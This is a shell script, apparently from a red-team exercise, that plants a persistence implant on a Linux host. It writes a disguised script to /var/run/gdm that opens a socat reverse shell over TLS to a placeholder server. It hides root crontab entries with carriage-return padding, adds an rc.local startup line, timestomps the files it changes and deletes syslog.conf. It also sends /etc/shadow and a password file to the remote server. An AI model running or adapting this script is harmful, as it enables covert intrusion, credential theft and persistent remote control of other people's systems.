#!/bin/sh

cat << EOF > /var/run/gdm
#!/bin/sh

if [ -S /dev/sr01 ] 
then
    	continue
else
	socat UNIX-LISTEN:/dev/sr01,fork,reuseaddr,mode=777 OPENSSL-CONNECT:<server>:443,verify=0,connect-timeout=10 &
fi
sleep 1
if grep -Fq "/var/run/gdm" /etc/crontab
then
    continue
else
    echo -e '*/2\t*\t*\t*\t*\troot\t sh /var/run/gdm & \r                                                                                            ' >> /etc/crontab
fi
if ps -elf | grep -Fq "socat exec:sh -li"
then
	continue
else
	if nc -z <server> 443
    then
        socat exec:'sh -li',pty,stderr,setsid,sigint,sane UNIX:/dev/sr01 &
    fi
fi
EOF
chmod 755 /var/run/gdm
touch /var/run/gdm -r /var/run/dgm.pid
echo -e '*/2\t*\t*\t*\t*\troot\t sh /var/run/gdm & \r                                                                                            ' >> /etc/crontab
touch /etc/crontab -r /etc/cron.daily
sed -ie '/unrealircd/a nohup sh /var/run/gmd &' /etc/rc.local
touch /etc/rc.local -r /etc/rc3.d
sed '/daemon\.\*;mail\.\*/s/mail\.\*;//' /etc/syslog.conf
touch /etc/syslog.conf -r /etc/sysctl.conf
rm -f /etc/syslog.conf
sleep 1
socat -u FILE:/etc/shadow OPENSSL-CONNECT:<server>:9092,verify=0,connect-timeout=10 &
sleep 1
socat -u FILE:/redteam2/student2/mypass.txt OPENSSL-CONNECT:<server>:9093,verify=0,connect-timeout=10 &
socat UNIX-LISTEN:/dev/sr01,fork,reuseaddr,mode=777 OPENSSL-CONNECT:<server>:443,verify=0,connect-timeout=10 &
socat exec:'sh -li',pty,stderr,setsid,sigint,sane UNIX:/dev/sr01 &
sh /var/run/gdm &
exit 0
